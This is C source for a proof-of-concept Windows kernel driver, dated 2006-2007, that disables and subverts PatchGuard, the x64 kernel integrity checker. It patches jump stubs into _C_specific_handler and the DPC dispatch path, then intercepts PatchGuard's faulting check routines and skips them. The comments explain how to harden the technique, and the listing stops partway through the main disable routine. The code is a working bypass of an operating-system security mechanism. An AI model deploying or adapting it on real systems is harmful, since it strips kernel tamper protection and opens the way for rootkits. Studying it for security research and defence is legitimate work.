//
// PatchGuard Disable and Subvert Driver
// Copyright (C) 2006-2007 Ken Johnson (Skywing)
//
// This driver demonstrates one possible approach to programmatically disabling
// PatchGuard version 2.  Additionally, it demonstrates one possible approach
// for taking control of the PatchGuard system integrity check routine.
//
// This source code listing is intended as a minimal proof of concept and
// should not, as a result, be considered production-quality source code.  In
// particular, there are various simplifications (rare race conditions are
// ignored, prologues are assumed instead of disassembled, and soforth) and
// assumptions that would need to be addressed in a production-quality
// implementation.
//
// The author explicitly disclaims all warranties (including implicit
// warranties) and responsibility relating to software derived from the
// knowledge gained by understanding this code listing (or the use of this code
// listing).  In particular, the author explicitly does not warrant that this
// code listing will remain effective for future operating system releases.
//
// Ken Johnson (Skywing)
// skywing@valhallalegends.com
//

#include <ntifs.h>
#include <Aux_klib.h>
#include "pgdisabl.h"

//
// Subvert PatchGuard to call our routines instead?  Disabling this simply
// has us skip PatchGuard.  Otherwise, we make PatchGuard call us instead of
// itself.
// 

#define PG_SUBVERT_PATCHGUARD 0

//
// The PatchGuard version we support.
//

#define PG_PATCHGUARD_VERSION 3

//
// Enable the DeviceObject control interface
//

#define PG_ENABLE_DEVICE_OBJECT 1

//
// Max stack traces we search.
//

#define PG_MAX_STACK_TRACES 63

typedef struct _IPI_CALL_PACKET
{
	PVOID            PoolAddress;
	ULONG64          Key;
	ULONG            ProcessorNumber;
	BOOLEAN          ScanForward;
	UCHAR            Spare[ 3 ];
	PUCHAR           Code;

	volatile ULONG64 Finished;
} IPI_CALL_PACKET, * PIPI_CALL_PACKET;

DRIVER_INITIALIZE DriverEntry;
DRIVER_UNLOAD     DriverUnload;
KTIMER            FindDpcCallerTimer;
KDPC              FindDpcCallerDpc;
KEVENT            FindDpcCallerEvent;
PVOID             DpcCaller;
ULONG64           PgKiTimerExpirationThunkJmp;
ULONG64           PgKiTimerExpirationThunkRetPoint;
ULONG64           NtosBase;
ULONG64           NtosLimit;
ULONG             NtMajorVersion;
ULONG             NtMinorVersion;
ULONG             PgPatchGuardCount;
PRUNTIME_FUNCTION PgKiTimerExpirationInfo;
PVOID             PgKiTimerExpiration;
PRUNTIME_FUNCTION PgKiRetireDpcListInfo;
PVOID             PgKiRetireDpcList;
volatile BOOLEAN  PgDisableDriver;

#ifdef ALLOC_PRAGMA
#pragma alloc_text( INIT, DriverEntry )
#endif // ALLOC_PRAGMA

ULONG64 PgRealDpcRoutineReturnAddress;
ULONG64 PgCSpecificHandlerRsp;

ULONG PgBreakOnPatchGuard = 1;
PVOID _C_specific_handler;
PVOID Orig_C_specific_handlerRestorePointer;
PVOID My_C_specific_handler = PgCSpecificHandler;
PKDEFERRED_ROUTINE PgPatchGuardDpcRoutine;
PgOrig_C_specific_handlerRoutine PgOrig_C_specific_handler;
PEPROCESS InitialSystemProcess;
PEPROCESS IdleSystemProcess;

NTSTATUS
PgDisablePatchGuardCSpecificHandler(
	VOID
	);

//
// Define runtime exception handling prototypes.
//

NTSYSAPI
VOID
__cdecl
RtlRestoreContext (
    IN PCONTEXT ContextRecord,
    IN struct _EXCEPTION_RECORD *ExceptionRecord OPTIONAL
    );

ULONG64 PgCSpecificHandlerArguments[ 4 ];

UCHAR Pg_C_specific_handler_hook[ 0xF ] =
{
	0x48,
	0xB8,
	0x00,
	0x00,
	0x00,
	0x00,
	0x00,
	0x00,
	0x00,
	0x00,
	0xFF,
	0xE0,
	0x90,
	0x90,
	0x90
};

UCHAR PgDpcCallerHook[ 0xF ] =
{
	0x48,
	0xB8,
	0x00,
	0x00,
	0x00,
	0x00,
	0x00,
	0x00,
	0x00,
	0x00,
	0xFF,
	0xE0,
	0x90,
	0x90,
	0x90
};

UCHAR PgOrigDpcCaller[ 0xF ] =
{
	0
};

#if PG_PATCHGUARD_VERSION == 3
BOOLEAN
PgIsVersion3DpcCaller(
	__in    PCONTEXT ContextRecord,
	__out   PCONTEXT UnwindContext,
	__inout PEXCEPTION_RECORD ExceptionRecord,
	__inout PUNWIND_HISTORY_TABLE UnwindHistoryTable,
	__in    BOOLEAN IsTimerDispatcher
	)
{
	PRUNTIME_FUNCTION             RuntimeFunction;
	PVOID                         HandlerData;
	ULONG64                       EstablisherFrame;
	ULONG64                       ImageBase;
	ULONG                         FrameCount;

	//
	// We've got the following heuristics here:
	//
	// 1. Does the caller have the DPC routine in its context, and
	// 2. Does the caller have a non-cannonical RDX
	//
	// (For no. 2, KiCustomRecurseRoutine* always has the DpcContext value in
	//  RDX in the current version three implementation.  We use this to help
	//  us reduce false positives, although it is already pretty unlikely that
	//  DPC routines inside ntos will throw AVs legitimately anyway.)
	//

	if (1)
	{
		//
		// Okay, search for the DPC return address in our stack frame.  We'll
		// unwind manually at the exception context record until we run into
		// the marker DPC return address or a zero return address.
		//

		KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgIsVersion3DpcCaller(): Searching for DPC Return Address in stack...\n"));

		//
		// We'll use the real context instead of the exception context.  This
		// is because PatchGuard intentionally corrupts various aspects of the
		// exception context (e.g. pointing RIP to a bogus instruction) in
		// order to prevent a complete programmatic unwind past a certain point
		// being successful.  However, the call stack cannot lie, so we'll use
		// it instead.
		//

		RtlCaptureContext(
			UnwindContext
			);

//		RtlCopyMemory(
//			UnwindContext,
//			ContextRecord,
//			sizeof(CONTEXT));

		for (FrameCount = 0;
		     ;
		     FrameCount += 1)
		{
			KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgIsVersion3DpcCaller(): Inspecting frame %lu (RIP=%p)...\n",
				FrameCount,
				UnwindContext->Rip));

			//
			// We can rule out the timer dispatcher based on whether we are in
			// the idle or system processes.
			//

//			if (IsTimerDispatcher)
//			{
				if (AreFunctionsTheSame(
					(PVOID)UnwindContext->Rip,
					PgKiTimerExpiration,
					UnwindHistoryTable))
				{
					//
					// We've found it.
					//

					KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgIsVersion3DpcCaller(): Found KiTimerExpiration on frame %lu!\n",
						FrameCount));

					return TRUE;
				}
//			}

			UNREFERENCED_PARAMETER( IsTimerDispatcher );

			//
			// Plain DPCs are executed from any process.
			//
	
			if (AreFunctionsTheSame(
				(PVOID)UnwindContext->Rip,
				PgKiRetireDpcList,
				UnwindHistoryTable))
			{
				//
				// We've found it.
				//

				KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgIsVersion3DpcCaller(): Found KiRetireDpcList on frame %lu!\n",
					FrameCount));

				return TRUE;
			}

			//
			// No - we'll effect a virtual unwind and check the next frame.
			//

			//
			// Try to look up unwind metadata for the current function.
			//

			RuntimeFunction = RtlLookupFunctionEntry(
				UnwindContext->Rip,
				&ImageBase,
				UnwindHistoryTable
				);

			if (!RuntimeFunction)
			{
				//
				// If we don't have a RUNTIME_FUNCTION, then we've encountered
				// a leaf function.  Adjust the stack approprately.
				//

				UnwindContext->Rip  = (ULONG64)(*(PULONG64)UnwindContext->Rsp);
				UnwindContext->Rsp += 8;
			}
			else
			{
				//
				// Otherwise, call upon RtlVirtualUnwind to execute the unwind for
				// us.
				//

				RtlVirtualUnwind(
					UNW_FLAG_NHANDLER,
					ImageBase,
					UnwindContext->Rip,
					RuntimeFunction,
					UnwindContext,
					&HandlerData,
					&EstablisherFrame,
					0
					);
			}

			//
			// If we reach an RIP of zero, this means that we've walked off the end
			// of the call stack and are done.
			//

			if (!UnwindContext->Rip)
			{
				KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgIsVersion3DpcCaller(): Reached end of stack.\n"));
				break;
			}

			//
			// Make sure that we don't unwind into user mode or the stack could
			// be paged out or worse.
			//

			if (UnwindContext->Rsp < (ULONG64)MM_SYSTEM_RANGE_START)
			{
				KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgIsVersion3DpcCaller(): Reached user mode stack.\n"));
				break;
			}

		}
	}

	//
	// It doesn't appear that this is a PatchGuard version 3 faulting DPC.
	// Indicate to the caller that we're shouldn't interfere.
	//

	return FALSE;
}
#endif

#if PG_PATCHGUARD_VERSION == 3
EXCEPTION_DISPOSITION
NTAPI
PgCSpecificHandler(
	__in PEXCEPTION_RECORD ExceptionRecord,
	__in ULONG64 EstablisherFrame,
	__inout PCONTEXT ContextRecord,
	__inout struct _DISPATCHER_CONTEXT* DispatcherContext
	)
{
//	UNWIND_HISTORY_TABLE UnwindHistoryTable;
//	CONTEXT              UnwindContext;

	//
	// Check if we're AV'ing on a kernel address.  (This should never happen,
	// except in the case of PatchGuard.  It is considered illegal to use a
	// try/except to guard against invalid kernel addresses; the system is
	// supposed to always crash in that case.)
	//

	//
	// Initialize the unwind history table.
	//

//	RtlZeroMemory(
//		&UnwindHistoryTable,
//		sizeof(UNWIND_HISTORY_TABLE));
//
//	UnwindHistoryTable.Unwind = TRUE;

	if ((ExceptionRecord->ExceptionCode & 0xC0000000) == 0xC0000000 &&
		ExceptionRecord->NumberParameters == 2                      &&
		PgIsVersion3DpcCaller(
			ContextRecord,
			ContextRecord,
			ExceptionRecord,
			DispatcherContext->HistoryTable,
			(PsGetCurrentProcess() == IdleSystemProcess ||
			 PsGetCurrentProcess() == InitialSystemProcess)
			))
	{
		//
		// Okay, we're probably PatchGuard trying to do something evil.  Let's
		// try and bypass the checker routine.
		//

		KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgCSpecificHandler(): Caught PatchGuard with Exr %p Cxr %p (RIP %p R/W %x on VA %p)...\n",
			ExceptionRecord,
			ContextRecord,
			ExceptionRecord->ExceptionAddress,
			(ULONG)ExceptionRecord->ExceptionInformation[ 0 ],
			ExceptionRecord->ExceptionInformation[ 1 ]));

		if (PgBreakOnPatchGuard)
		{
			KdPrintEx((DPFLTR_IHVDRIVER_ID, 0,
				"PGDISABL: PgCSpecificHandler(): Breaking on PatchGuard check routine; use the commands:  .exr %p ; .cxr %p\n"
				"PGDISABL: PgCSpecificHandler(): To examine the proposed effective return context, issue the command:  .cxr %p\n",
				ExceptionRecord,
				ContextRecord,
				/*&UnwindContext*/ ContextRecord);
			KdBreakPoint());
		}

		PgPatchGuardCount += 1;

		//
		// Realize the new context directly.  Do not perform an unwind as we
		// may already be in an unwind and this may result in breakage.
		//

		RtlRestoreContext(
			ContextRecord,
			0
			);

		//
		// Should not return to here...
		//

		__assume(0);

		/*
		//
		// Copy the unwind context over the current context and realize it by
		// returning continue execution.
		//

		RtlCopyMemory(
			ContextRecord,
			UnwindContext,
			sizeof(CONTEXT)
			);

		return ExceptionContinueExecution;
		*/
	}

	KdPrintEx((DPFLTR_IHVDRIVER_ID, 1, "PGDISABL: PgCSpecificHandler(): Passing on exception (Exr %p Cxr %p - %08X - %p - %p - %lu - %lu) to original handler.\n",
		ExceptionRecord,
		ContextRecord,
		ExceptionRecord->ExceptionCode,
		ExceptionRecord->ExceptionAddress,
		ExceptionRecord->NumberParameters == 2 ? ExceptionRecord->ExceptionInformation[ 1 ] : 0,
		PsGetCurrentProcess() == IdleSystemProcess || PsGetCurrentProcess() == InitialSystemProcess,
		ExceptionRecord->NumberParameters == 2));

	if (ExceptionRecord->ExceptionAddress == (PVOID)0xfffff800018ddfc0)
	{
		KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgCSpecificHandler(): We failed to find it!  See above info ...\n"));
		KdBreakPoint();
	}

	return PgOrig_C_specific_handler(
		ExceptionRecord,
		EstablisherFrame,
		ContextRecord,
		DispatcherContext
		);
}

#elif PG_PATCHGUARD_VERSION == 2
EXCEPTION_DISPOSITION
NTAPI
PgCSpecificHandler(
	__in PEXCEPTION_RECORD ExceptionRecord,
	__in ULONG64 EstablisherFrame,
	__inout PCONTEXT ContextRecord,
	__inout struct _DISPATCHER_CONTEXT* DispatcherContext
	)
{
	//
	// Check if we're AV'ing on a kernel address.  (This should never happen,
	// except in the case of PatchGuard.  It is considered illegal to use a
	// try/except to guard against invalid kernel addresses; the system is
	// supposed to always crash in that case.)
	//

	if (ExceptionRecord->ExceptionCode == STATUS_ACCESS_VIOLATION &&
		IS_KERNEL_ADDRESS(ExceptionRecord->ExceptionAddress)      &&
		ExceptionRecord->NumberParameters >= 2                    &&
		IS_KERNEL_ADDRESS(ExceptionRecord->ExceptionInformation[ 1 ]))
	{
		PRUNTIME_FUNCTION  RuntimeFunction;
		ULONG64            ImageBase;
		PEXCEPTION_ROUTINE ExceptionRoutine;
		PVOID              HandlerData;

		//
		// Okay, we're probably PatchGuard trying to do something evil.  Let's
		// try and bypass the checker routine.
		//

		KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: Caught PatchGuard with Exr %p Cxr %p (RIP %p R/W %x on VA %p)...\n",
			ExceptionRecord,
			ContextRecord,
			ExceptionRecord->ExceptionAddress,
			(ULONG)ExceptionRecord->ExceptionInformation[ 0 ],
			ExceptionRecord->ExceptionInformation[ 1 ]));

		if (PgBreakOnPatchGuard)
		{
			KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: Breaking on PatchGuard check routine; use the commands:  .exr %p ; .cxr %p\n",
				ExceptionRecord,
				ContextRecord);
			KdBreakPoint());
		}

#if 0
		//
		// Let's initiate a virtual unwind past the DPC routine to the caller.
		//
		// This is okay, because the caller should just be doing DPC dispatches
		// and won't care anything about what we're doing.
		//

		RuntimeFunction = RtlLookupFunctionEntry(
			(ULONG64)ExceptionRecord->ExceptionAddress,
			&ImageBase,
			0);

		if (!RuntimeFunction)
		{
			KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: Failed to locate RuntimeFunction for %p...\n",
				ExceptionRecord->ExceptionAddress));
			KdBreakPoint();
			return ExceptionContinueSearch;
		}

		//
		// If PatchGuard Subversion is enabled, then we'll try to subvert
		// PatchGuard for nefarious purposes... muahahaha (well, if you count
		// doing a demo DbgPrint nefarious purposes, anyway).
		//

#if PG_SUBVERT_PATCHGUARD
		if (PgSubvertPatchGuard(
			ExceptionRecord,
			EstablisherFrame,
			ContextRecord,
			DispatcherContext,
			RuntimeFunction,
			ImageBase))
		{
			KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: Successfully subverted PatchGuard.\n"));

			//
			// Unhook from _C_cpecific_handler as we don't need it anymore.
			//

			PgHookCSpecificHandler(FALSE);

			//
			// Return a bogus return value now - it'll be ignored since we are
			// actually returning to PgCSpecificHandlerUnhookReturnPoint, which
			// will ensure rcx/rdx/r8/r9 are setup properly and then jump to
			// the original _C_specific_handler's first instruction.
			//

			//
			// Adjust our return address as we have unhooked from the exception
			// handler and don't want to return into the middle of it.
			// Instead, we'll magically return to the *start* of the exception
			// handler with all of the argument registers intact.  Neat, huh?
			//
			// Note that this only works because we know that PatchGuard won't
			// be called from multiple threads simultaneously, or recursively,
			// or anything like that.  As a result, we can get away with being
			// sleazy and storing things that should normally be stack-based as
			// global variables.
			//

			*(void**)_AddressOfReturnAddress() = PgCSpecificHandlerUnhookReturnPoint;

			//
			// Save away the arguments to this _C_specific_handler
			// call instance.
			//

			PgCSpecificHandlerArguments[ 0 ] = (ULONG64)ExceptionRecord;
			PgCSpecificHandlerArguments[ 1 ] = (ULONG64)EstablisherFrame;
			PgCSpecificHandlerArguments[ 2 ] = (ULONG64)ContextRecord;
			PgCSpecificHandlerArguments[ 3 ] = (ULONG64)DispatcherContext;

			return ExceptionContinueExecution; // Ignored!
		}
#endif

		if (PgBreakOnPatchGuard)
		{
			KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: Invoking RtlVirtualUnwind for Exr %p Cxr %p Rtfe %p...\n",
				ExceptionRecord,
				ContextRecord,
				RuntimeFunction));
			KdBreakPoint();
		}

		//
		// Invoke a virtual procedure call unwind.  This is essentially
		// executing an immediate return from the faulting function.  While it
		// simulates the restoration of the stack, it does not invoke any of
		// the evil PatchGuard checking code in the faulting routine.
		//

		ExceptionRoutine = RtlVirtualUnwind(
			UNW_FLAG_NHANDLER,
			ImageBase,
			(ULONG64)ExceptionRecord->ExceptionAddress,
			RuntimeFunction,
			ContextRecord,
			&HandlerData,
			&EstablisherFrame,
			0);

		if (PgBreakOnPatchGuard)
		{
			KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: RtlVirtualUnwind completed (returned ExceptionRoutine %p).\n"
				     "Examine the previously supplied context record to see the new exception return information.\n"
					 , ExceptionRoutine));
			KdBreakPoint();
		}
#endif

		return ExceptionContinueExecution;
	}

	KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: Passing on exception (Exr %p Cxr %p) to original handler.\n",
		ExceptionRecord,
		ContextRecord));

	return PgOrig_C_specific_handler(
		ExceptionRecord,
		EstablisherFrame,
		ContextRecord,
		DispatcherContext);
}
#else
#error Unsupported version
#endif


NTSTATUS
NTAPI
PgHookCSpecificHandler(
	__in BOOLEAN Enable
	)
{
	PMDL        Mdl;
	PVOID       LockedVa;
	NTSTATUS    Status;

	Mdl      = 0;
	LockedVa = 0;

	for (;;)
	{
		//
		// Create a MDL describing system space for _C_specific_handler.
		//

		Mdl = IoAllocateMdl(
			_C_specific_handler,
			0xF,
			FALSE,
			FALSE,
			0);

		if (!Mdl)
		{
			Status = STATUS_INSUFFICIENT_RESOURCES;
			KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: Failed to allocate MDL.\n"));
			break;
		}

		MmBuildMdlForNonPagedPool(
			Mdl);

		//
		// Retrieve a locked VA mapping.
		//

		if (!(LockedVa = (PUCHAR)MmMapLockedPagesSpecifyCache(
			Mdl,
			KernelMode,
			MmCached,
			0,
			FALSE,
			NormalPagePriority)))
		{
			Status = STATUS_ACCESS_VIOLATION;
			KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: Failed to map kernel VA for _C_specific_handler.\n"));
			break;
		}

		//
		// If we're requested to hook it then do so now...
		//

		if (Enable)
		{
			//
			// Setup the restore pointer.
			//

			Orig_C_specific_handlerRestorePointer = (PUCHAR)_C_specific_handler + 0xF;

			//
			// Copy over our hook on _C_specific_handler.
			//

			RtlCopyMemory(
				LockedVa,
				Pg_C_specific_handler_hook,
				0xF);
		}
		else
		{
			//
			// Unhook the function by copying back the original bits...
			//

			RtlCopyMemory(
				LockedVa,
				PgOrig_C_specific_handler,
				0xF);
		}

		//
		// All done...
		//

		Status = STATUS_SUCCESS;

		break;
	}

	if (LockedVa)
		MmUnmapLockedPages(
			LockedVa,
			Mdl);

	if (Mdl)
		IoFreeMdl(
			Mdl);

	return Status;
}

NTSTATUS
NTAPI
PgHookDpcCaller(
	__in BOOLEAN Enable
	)
{
	PMDL        Mdl;
	PVOID       LockedVa;
	NTSTATUS    Status;

	Mdl      = 0;
	LockedVa = 0;

	for (;;)
	{
		//
		// Create a MDL describing system space for the DPC caller.
		//

		//
		// N.B. A better way to find the call instruction such that the size of
		// the instruction need not be assumed to be 2 bytes would be to find
		// an earlier point in the function via analysis of unwind metadata,
		// and forward disassembly until DpcCaller is reached.
		//

		Mdl = IoAllocateMdl(
			(PVOID)((ULONG64)DpcCaller - 0x02),
			0xF,
			FALSE,
			FALSE,
			0);

		if (!Mdl)
		{
			Status = STATUS_INSUFFICIENT_RESOURCES;
			KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: Failed to allocate MDL.\n"));
			break;
		}

		MmBuildMdlForNonPagedPool(
			Mdl);

		//
		// Retrieve a locked VA mapping.
		//

		if (!(LockedVa = (PUCHAR)MmMapLockedPagesSpecifyCache(
			Mdl,
			KernelMode,
			MmCached,
			0,
			FALSE,
			NormalPagePriority)))
		{
			Status = STATUS_ACCESS_VIOLATION;
			KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: Failed to map kernel VA for DpcCaller.\n"));
			break;
		}

		//
		// If we're requested to hook it then do so now...
		//

		if (Enable)
		{
			//
			// Setup the restore pointer.
			//

			//
			// N.B. Though these are hardcoded, an intelligent disassembler/patcher
			// that detects relative jumps and translates them into absolute jumps will
			// eliminate the need for manual code patching for the DPC return point.
			//
			// The way to implement that is to keep track of destination RIP
			// values given the original code stream, and for relative
			// references, convert them to 32-bit relative displacements to an
			// indirect jmp (if a conditional), or an indirect jmp inline (if
			// the instruction supports that).  A table of indirect jmps and
			// the indirected jump pointer values can be appended (or
			// prepended) to the patch code block when generating the automatic
			// patch.
			//
			// In the interest of simplicity, we are sticking with a hardcoded solution
			// for the proof of concept.  However, intelligent disassembler systems as
			// previously mentioned do exist (and are not really all that much more
			// difficult than a conventional disassembler-patcher system anyway).
			//

			PgKiTimerExpirationThunkJmp      = (ULONG64)DpcCaller + 0x05 + 0x2C;
			PgKiTimerExpirationThunkRetPoint = (ULONG64)DpcCaller + 0x13;

			//
			// Set the jump patch code - this can always be hardcoded and won't
			// ever need to change.
			//

			//
			// mov rax, OFFSET PgKiTimerExpirationThunk
			// jmp rax
			//

			//
			// N.B. In a "production" implementation, this logic is replaced with a
			// disassembler based patching system (of this there exist many).  This is
			// left as an exercise for the reader.  Note that due to the relative jump
			// after the patch, the disassembler needs to handle relative offset fixes;
			// there exists code to do this which is publicly accessible already, or it
			// can be relatively easily written for a subset of relative references.
			//
			// Note that as far as "backtracing" to find the call instruction, while it
			// is reasonable to assume the size of the call instruction used, an even
			// more reliable approach would be to query unwind information for the return
			// point and work forwards from the first address covered in that function
			// entry, which is even more robust provided that the caller is not a leaf
			// function (impossible, given that it is making a subfunction call).
			//

			if (NtMajorVersion == 6 && NtMinorVersion == 1)
				*(PULONGLONG)&PgDpcCallerHook[ 0x2 ] = (ULONGLONG)PgKiTimerExpirationThunk;
			else
				*(PULONGLONG)&PgDpcCallerHook[ 0x2 ] = (ULONGLONG)PgKiTimerExpirationThunk_Vista;

			//
			// Copy over our hook on DPC caller.
			//

			RtlCopyMemory(
				PgOrigDpcCaller,
				LockedVa,
				0xF);
			RtlCopyMemory(
				LockedVa,
				PgDpcCallerHook,
				0xF);
		}
		else
		{
			//
			// Unhook the function by copying back the original bits...
			//

			RtlCopyMemory(
				LockedVa,
				PgOrigDpcCaller,
				0xF);
		}

		//
		// All done...
		//

		Status = STATUS_SUCCESS;

		break;
	}

	if (LockedVa)
		MmUnmapLockedPages(
			LockedVa,
			Mdl);

	if (Mdl)
		IoFreeMdl(
			Mdl);

	return Status;
}

#if PG_PATCHGUARD_VERSION == 3

VOID
NTAPI
PgStackTraceDpcRoutine(
	IN struct _KDPC *Dpc,
	IN PVOID DeferredContext,
	IN PVOID SystemArgument1,
	IN PVOID SystemArgument2
	)
{
	DpcCaller = _ReturnAddress();

	//
	// We set DeferredContext to be the PKEVENT to signal completion.
	//

	KeSetEvent(
		(PKEVENT)DeferredContext,
		0,
		FALSE);
}

VOID
NTAPI
PgTimerDpcFilter(
	IN struct _KDPC *Dpc,
	IN PVOID DeferredContext,
	IN PVOID SystemArgument1,
	IN PVOID SystemArgument2
	)
{
	//
	// If this is not an NTOS DPC, then we'll pass through right away.  The
	// PatchGuard timer DPC routine is always in NTOS's image in-memory.
	//
/*
	if ((ULONG64)Dpc->DeferredRoutine < NtosBase ||
		(ULONG64)Dpc->DeferredRoutine > NtosLimit)
	{
		Dpc->DeferredRoutine(
			Dpc,
			DeferredContext,
			SystemArgument1,
			SystemArgument2);

		return;
	}
*/
	//
	// If we're an NTOS timer and we have a non-canonical kernel address as the
	// DeferredContext, then we'll assume that we've nailed PatchGuard.
	//
	// N.B. Right now, the highest user address and system range start values
	// define the "no-mans-land" that comprises all non-canonical addresses on
	// the current platform.
	//

	if ((ULONG64)DeferredContext > (ULONG64)MM_HIGHEST_USER_ADDRESS &&
		(ULONG64)DeferredContext < (ULONG64)MM_SYSTEM_RANGE_START)
	{
		KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PgTimerDpcFilter(): Found PatchGuard timer DPC!  KDPC = %p, DeferredContext = %p, DeferredRoutine = %p\n",
			Dpc,
			DeferredContext,
			Dpc->DeferredRoutine));

		PgPatchGuardCount += 1;

		return;
	}

	//
	// Pass the DPC on through as it doesn't look like it's PatchGuard.
	//

	Dpc->DeferredRoutine(
		Dpc,
		DeferredContext,
		SystemArgument1,
		SystemArgument2);
	return;
}

NTSTATUS
NTAPI
PgFindNtos(
	VOID
	)
{
	NTSTATUS                  Status;
	ULONG                     Size;
	ULONG                     Tries;
	ULONG                     i;
	PAUX_MODULE_EXTENDED_INFO ModuleInfo;

	//
	// Locate NTOS image base using AuxKlib - the documented method!
	//

	ModuleInfo = 0;
	Status     = AuxKlibInitialize();

	if (!NT_SUCCESS(Status))
	{
		KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: PgFindNtos(): AuxKlibInitialize fails, %08X\n",
			Status));

		return Status;
	}

	for (Tries = 0;
	     Tries < 3;
	     Tries += 1)
	{
		Size       = 0;
		ModuleInfo = 0;

		Status = AuxKlibQueryModuleInformation(
			&Size,
			sizeof(AUX_MODULE_EXTENDED_INFO),
			0);

		if (!NT_SUCCESS(Status))
		{
			KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PgFindNtos(): AuxKlibQueryModuleInformation(size) fails, %08X\n",
				Status));

			break;
		}

		ModuleInfo = (PAUX_MODULE_EXTENDED_INFO)ExAllocatePoolWithTag(
			PagedPool,
			Size,
			'iDgP');

		if (!ModuleInfo)
			break;

		Status = AuxKlibQueryModuleInformation(
			&Size,
			sizeof(AUX_MODULE_EXTENDED_INFO),
			ModuleInfo);

		if (Status == STATUS_BUFFER_TOO_SMALL)
		{
			ExFreePoolWithTag(
				ModuleInfo,
				'iDpG');
			ModuleInfo = 0;
			continue;
		}

		if (!NT_SUCCESS(Status))
			break;

		Status = STATUS_NOT_FOUND;

		//
		// Search the list for NTOS...
		//

		for (i = 0;
		     i < Size / sizeof(AUX_MODULE_EXTENDED_INFO);
		     i += 1)
		{
			PCHAR ModName;

			ModName = (PCHAR)(ModuleInfo[ i ].FullPathName +
				ModuleInfo[ i ].FileNameOffset);

			//
			// N.B. Assumes we weren't booted with the equivalent of KERNEL=...
			//

			if (!_stricmp(ModName, "ntoskrnl.exe"))
			{
				NtosBase  = (ULONG64)ModuleInfo->BasicInfo.ImageBase;
				NtosLimit = NtosBase + ModuleInfo->ImageSize;

				KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PgFindNtos(): nt = %p %p\n",
					(PVOID)NtosBase,
					(PVOID)NtosLimit));

				Status = STATUS_SUCCESS;
				break;
			}
		}

		if (NT_SUCCESS(Status))
			break;

		KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PgFindNtos(): Couldn't find ntoskrnl in loaded module list...\n"));
	}

	if (ModuleInfo)
		ExFreePoolWithTag(
			ModuleInfo,
			'iDgP');

	return Status;
}

NTSTATUS
NTAPI
PgDisablePatchGuardVersion3Init(
	VOID
	)
{
	LARGE_INTEGER DueTime;
	NTSTATUS      Status;

	//
	// Initialize DPC, Timer, and Event objects that we'll use to locate the
	// DPC caller (actually DPC return address, but close enough).
	//

	KeInitializeEvent(
		&FindDpcCallerEvent,
		NotificationEvent,
		FALSE);
	KeInitializeDpc(
		&FindDpcCallerDpc,
		PgStackTraceDpcRoutine,
		&FindDpcCallerEvent);
	KeInitializeTimer(&FindDpcCallerTimer);

	//
	// Set the timer up.  We'll want it to run immediately so we'll set the
	// interval as one relative 100-ns interval.
	//
	
	DueTime.QuadPart = -1;

	KeSetTimer(
		&FindDpcCallerTimer,
		DueTime,
		&FindDpcCallerDpc);

	//
	// Wait for the completion event that signals that we're in the DPC.
	//

	KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: Waiting on DPC to perform stack trace (Timer = %p, DPC = %p)...\n",
		&FindDpcCallerTimer,
		&FindDpcCallerDpc));

	KeWaitForSingleObject(
		&FindDpcCallerEvent,
		Executive,
		KernelMode,
		FALSE,
		0);

	//
	// Okay, now we need to wait for the DPC queue to drain, so that we're sure
	// that the DPC routine has returned.  Otherwise, there's a race condition
	// on multi-processor systems, where this processor might clean up the DPC
	// while the DPC routine was still running on a different processor, right
	// after it called KeSetEvent.
	//

	KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: Waiting for DPC queue to be flushed...\n"));
	KeFlushQueuedDpcs();

	//
	// Now, we should have the return address for all DPC callers.  This shall
	// enable us to identify the faulting DPCs.  This is important as in
	// version three, the logic for the general protection fault handler has
	// been altered such that the exception address is now a bogus value and
	// not a predictable -1 for non-canonical address dereferences.  We'll make
	// the assumption that no legitimate DPC will be throwing exceptions like
	// that.
	//

	if (DpcCaller == 0)
	{
		KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: Failed to locate DPC caller?\n"));
		return STATUS_UNSUCCESSFUL;
	}

	KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: Located DPC Caller (Return Address) = %p\n",
		DpcCaller));

	Status = PgHookDpcCaller(
		TRUE);

	if (!NT_SUCCESS(Status))
		return Status;

	KdPrintEx((DPFLTR_IHVDRIVER_ID, 0, "PGDISABL: Finished patching, PgKiTimerExpirationThunkJmp = %p, PgKiTimerExpirationThunkRetPoint = %p, PgOrigDpcCaller = %p\n",
		PgKiTimerExpirationThunkJmp,
		PgKiTimerExpirationThunkRetPoint,
		PgOrigDpcCaller
		));

	return STATUS_SUCCESS;
}

#endif

NTSTATUS
NTAPI
PgDisablePatchGuard(
	VOID
	)
{
	UNICODE_STRING ProcedureName;
	NTSTATUS       Status;
	ULONG          Major;
	ULONG          Minor;

	PsGetVersion(
		&Major,
		&Minor,
		0,
		0);

	NtMajorVersion = Major;
	NtMinorVersion = Minor;

	if (Major == 5 && Minor == 2)
		PgOrig_C_specific_handler = PgOrig_C_specific_handler_Srv03;
